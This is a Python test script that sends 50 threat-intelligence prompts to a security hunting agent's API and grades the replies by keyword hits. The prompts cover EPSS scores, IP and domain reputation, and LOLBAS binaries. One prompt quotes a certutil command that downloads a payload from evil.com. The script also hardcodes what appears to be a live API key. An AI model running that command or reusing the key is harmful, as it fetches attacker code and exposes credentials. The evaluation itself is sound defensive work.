"""Intelligence enrichment evaluation — tests all new Tier 1 data sources."""

import json
import os
import time

import requests

os.environ["PYTHONIOENCODING"] = "utf-8"

BASE = "https://mssphuntagent-fn.azurewebsites.net/api/v1"
KEY = "qvMa0mwbfz3itHZMO20kbkWfpAr-oY9_1WHmJpFeK2EmAzFuK-xiGQ=="

PROMPTS = [
    # === EPSS / CVE ENRICHMENT (10) ===
    ("EPSS", "Are we vulnerable to CVE-2024-3400", ["epss", "exploit", "probability", "CVSS"]),
    ("EPSS", "Look up CVE-2024-21887 and tell me the exploit probability", ["epss", "exploit", "probability"]),
    ("EPSS", "Are we exposed to Log4Shell CVE-2021-44228", ["epss", "exploit", "CVSS"]),
    ("EPSS", "How likely is CVE-2024-3400 to be exploited in the wild", ["epss", "probability", "exploit"]),
    ("EPSS", "What is the EPSS score for CVE-2023-44228", ["epss", "score", "probability"]),
    ("EPSS", "Prioritize these CVEs by exploit risk: CVE-2024-3400 and CVE-2024-21887", ["epss", "priority", "exploit"]),
    ("EPSS", "Are we vulnerable to CVE-2026-21262 and how likely is it to be weaponized", ["epss", "exploit"]),
    ("EPSS", "Check CVE-2025-21298 and tell me if a public exploit exists", ["epss", "exploit"]),
    ("EPSS", "What is the exploit probability for the Palo Alto PAN-OS vulnerability", ["epss", "CVE-2024-3400"]),
    ("EPSS", "Give me the full risk profile for CVE-2024-3400 including CVSS EPSS and CISA KEV status", ["epss", "CVSS", "KEV"]),

    # === IP REPUTATION / IOC ENRICHMENT (15) ===
    ("IP_INTEL", "Check IP 185.220.101.42 for threat intelligence", ["tor", "reputation", "threat"]),
    ("IP_INTEL", "Is IP 185.220.101.1 a known TOR exit node", ["tor", "exit"]),
    ("IP_INTEL", "Enrich IP 8.8.8.8 with all available threat intelligence", ["shodan", "reputation"]),
    ("IP_INTEL", "Check if IP 45.33.32.156 is malicious", ["reputation", "threat"]),
    ("IP_INTEL", "What do we know about IP 198.51.100.1 from threat feeds", ["reputation", "intel"]),
    ("IP_INTEL", "Is this IP associated with any botnet C2: 185.220.101.42", ["c2", "botnet", "feodo"]),
    ("IP_INTEL", "Run full threat enrichment on IP 104.21.75.100", ["shodan", "reputation", "tor"]),
    ("IP_INTEL", "Check this suspicious IP from our sign-in logs: 136.33.158.146", ["reputation", "threat"]),
    ("IP_INTEL", "We see connections to 45.95.147.236 from an endpoint. Is this malicious", ["reputation", "c2", "threat"]),
    ("IP_INTEL", "Enrich these IPs from a brute force alert: 185.220.101.42 and 45.33.32.156", ["reputation", "tor"]),
    ("IP_INTEL", "Check domain evil-corp-phishing.com against threat intelligence", ["threatfox", "malware"]),
    ("IP_INTEL", "Is the domain login-microsoft365.com known to be malicious", ["threatfox", "phishing"]),
    ("IP_INTEL", "Enrich this file hash: 44d88612fea8a8f36de82e1278abb02f", ["threatfox", "malware", "hash"]),
    ("IP_INTEL", "Check SHA256 hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 against threat feeds", ["threatfox", "hash"]),
    ("IP_INTEL", "We found a suspicious domain in DNS logs: cdn-update-check.com. Is it known malicious", ["threatfox", "malware"]),

    # === LOLBAS / LOLDrivers (10) ===
    ("LOLBAS", "Is mshta.exe a known living-off-the-land binary", ["lolbas", "T1", "abuse"]),
    ("LOLBAS", "Check if certutil.exe can be abused for attacks", ["lolbas", "T1", "abuse"]),
    ("LOLBAS", "What MITRE techniques are associated with rundll32.exe abuse", ["lolbas", "T1", "technique"]),
    ("LOLBAS", "Is regsvr32.exe a LOLBAS binary and how can it be abused", ["lolbas", "T1", "abuse"]),
    ("LOLBAS", "Check if installutil.exe is used in any attack techniques", ["lolbas", "T1"]),
    ("LOLBAS", "What living-off-the-land binaries are commonly used for defense evasion", ["lolbas", "evasion"]),
    ("LOLBAS", "Is wmic.exe a known LOLBin", ["lolbas", "T1"]),
    ("LOLBAS", "We see powershell.exe spawning mshta.exe. Is this suspicious", ["lolbas", "suspicious"]),
    ("LOLBAS", "Check if bitsadmin.exe can be used for malicious file downloads", ["lolbas", "T1", "download"]),
    ("LOLBAS", "We found a driver file procexp152.sys on an endpoint. Is this a known vulnerable driver", ["loldriver", "driver", "vulnerable"]),

    # === COMBINED INTELLIGENCE (15) ===
    ("COMBINED", "We found sign-ins from IP 185.220.101.42 to admin account trevor.cutshall. Is this IP malicious and should we be concerned", ["tor", "reputation", "admin", "risk"]),
    ("COMBINED", "An endpoint ran certutil.exe -urlcache -f http://evil.com/payload.exe. Analyze this for threats", ["lolbas", "certutil", "T1"]),
    ("COMBINED", "We detected mshta.exe executing a script from a TOR exit node IP. Walk me through the investigation", ["lolbas", "tor", "T1"]),
    ("COMBINED", "CVE-2024-3400 was announced. What is the EPSS score and do we have Palo Alto devices in our environment", ["epss", "CVE-2024-3400", "Sentinel"]),
    ("COMBINED", "Check if any IPs in our failed sign-in logs appear in threat intelligence feeds", ["reputation", "sign-in", "threat"]),
    ("COMBINED", "Hunt for any LOLBin abuse in our environment in the last 7 days", ["lolbas", "DeviceProcessEvents", "SecurityEvent"]),
    ("COMBINED", "We received a threat intel report about IP 45.95.147.236. Check our logs for any connections to it", ["reputation", "query", "Sentinel"]),
    ("COMBINED", "Enrich all suspicious IPs from our latest brute force analysis with threat intelligence", ["reputation", "brute", "enrich"]),
    ("COMBINED", "A phishing email contained a link to cdn-malware-update.com. Check if this domain is known malicious and if anyone clicked it", ["threatfox", "phishing", "query"]),
    ("COMBINED", "We found rundll32.exe loading a suspicious DLL. Check if this is LOLBin abuse and check the DLL hash against threat feeds", ["lolbas", "hash", "threatfox"]),
    ("COMBINED", "Assess our vulnerability to CVE-2024-3400 with full context: CVSS, EPSS, CISA KEV, and environment telemetry check", ["epss", "CVSS", "KEV", "Sentinel"]),
    ("COMBINED", "Hunt for indicators of compromise using all available intelligence sources", ["threatfox", "tor", "lolbas", "Sentinel"]),
    ("COMBINED", "Check if any of our admin accounts are signing in from known malicious IPs", ["reputation", "admin", "sign-in"]),
    ("COMBINED", "We see wmic.exe making network connections. Is this LOLBAS abuse and where is it connecting to", ["lolbas", "wmic", "network"]),
    ("COMBINED", "Full threat assessment: check CVE-2024-21887, enrich any IOCs found, and verify our detection coverage", ["epss", "CVE", "enrich", "detection"]),
]


def main():
    print("=" * 70)
    print("  INTELLIGENCE ENRICHMENT EVALUATION")
    print(f"  Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Prompts: {len(PROMPTS)}")
    print("=" * 70)

    # Submit all
    rids = []
    for i, (cat, prompt, _) in enumerate(PROMPTS):
        try:
            r = requests.post(f"{BASE}/ask?code={KEY}", json={"message": prompt}, timeout=15)
            rid = r.json().get("request_id", "FAIL")
        except Exception as e:
            rid = f"FAIL:{e}"
        rids.append(rid)
        if (i + 1) % 10 == 0:
            print(f"  Submitted {i+1}/{len(PROMPTS)}...")

    print(f"\n  Waiting 180s for responses...")
    time.sleep(180)

    # Poll and grade
    results = {"EPSS": [], "IP_INTEL": [], "LOLBAS": [], "COMBINED": []}
    total_pass = 0
    total_fail = 0
    total_error = 0

    for i, (cat, prompt, keywords) in enumerate(PROMPTS):
        rid = rids[i]
        try:
            r = requests.get(f"{BASE}/ask/{rid}?code={KEY}", timeout=15)
            d = r.json()
        except Exception:
            d = {"status": "error"}

        if d.get("status") == "processing":
            time.sleep(45)
            try:
                r = requests.get(f"{BASE}/ask/{rid}?code={KEY}", timeout=15)
                d = r.json()
            except Exception:
                d = {"status": "error"}

        status = d.get("status", "?")
        resp = d.get("response", "") or ""
        resp_lower = resp.lower()

        if status != "completed":
            total_error += 1
            results[cat].append(("ERROR", prompt[:60], 0, len(keywords)))
            continue

        # Check how many expected keywords appear in response
        hits = sum(1 for kw in keywords if kw.lower() in resp_lower)
        hit_rate = hits / len(keywords) if keywords else 0

        # Grade
        if hit_rate >= 0.5:
            grade = "PASS"
            total_pass += 1
        else:
            grade = "FAIL"
            total_fail += 1
            # Print failures for debugging
            missing = [kw for kw in keywords if kw.lower() not in resp_lower]
            print(f"  FAIL #{i+1} [{cat}] missing: {missing} | {prompt[:50]}")

        results[cat].append((grade, prompt[:60], hits, len(keywords)))

    # Scorecard
    print(f"\n{'=' * 70}")
    print(f"  INTELLIGENCE ENRICHMENT SCORECARD")
    print(f"{'=' * 70}")
    print(f"  Total: {len(PROMPTS)} | Pass: {total_pass} | Fail: {total_fail} | Error: {total_error}")
    print(f"  Overall: {total_pass}/{len(PROMPTS)} ({total_pass/len(PROMPTS)*100:.0f}%)")

    for cat in ["EPSS", "IP_INTEL", "LOLBAS", "COMBINED"]:
        cat_results = results[cat]
        cat_pass = sum(1 for r in cat_results if r[0] == "PASS")
        cat_total = len(cat_results)
        print(f"\n  {cat}: {cat_pass}/{cat_total} ({cat_pass/cat_total*100:.0f}%)")
        for grade, prompt, hits, total_kw in cat_results:
            marker = "PASS" if grade == "PASS" else "FAIL" if grade == "FAIL" else "ERR "
            print(f"    [{marker}] {hits}/{total_kw} kw | {prompt}")


if __name__ == "__main__":
    main()
